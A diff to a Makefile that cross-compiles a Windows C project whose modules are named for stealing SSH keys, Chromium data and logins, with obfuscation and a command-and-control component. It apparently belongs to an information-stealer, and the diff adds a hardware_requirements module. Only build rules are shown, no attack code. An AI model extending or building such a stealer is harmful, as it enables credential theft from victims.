@@ -4,7 +4,7 @@ INCLUDE_DIR = include/
 OBJ_DIR = obj/
 
 # add the object file used here
-OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o  $(OBJ_DIR)chromium.o $(OBJ_DIR)path.o $(OBJ_DIR)logins.o $(OBJ_DIR)sqlite3.o $(OBJ_DIR)aes.o $(OBJ_DIR)c2.o
+OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o  $(OBJ_DIR)chromium.o $(OBJ_DIR)path.o $(OBJ_DIR)logins.o $(OBJ_DIR)hardware_requirements.o $(OBJ_DIR)sqlite3.o $(OBJ_DIR)aes.o $(OBJ_DIR)c2.o
 
 CC=x86_64-w64-mingw32-gcc
 CFLAGS=-g -fPIE -O2 -s -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
@@ -46,6 +46,9 @@ $(OBJ_DIR)path.o : $(SRC_DIR)path.c $(INCLUDE_DIR)path.h
 	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 $(OBJ_DIR)logins.o : $(SRC_DIR)logins.c $(INCLUDE_DIR)logins.h
+	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
+
+$(OBJ_DIR)hardware_requirements.o : $(SRC_DIR)hardware_requirements.c $(INCLUDE_DIR)hardware_requirements.h
 	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 $(OBJ_DIR)sqlite3.o : $(SRC_DIR)sqlite3.c $(INCLUDE_DIR)sqlite3.h
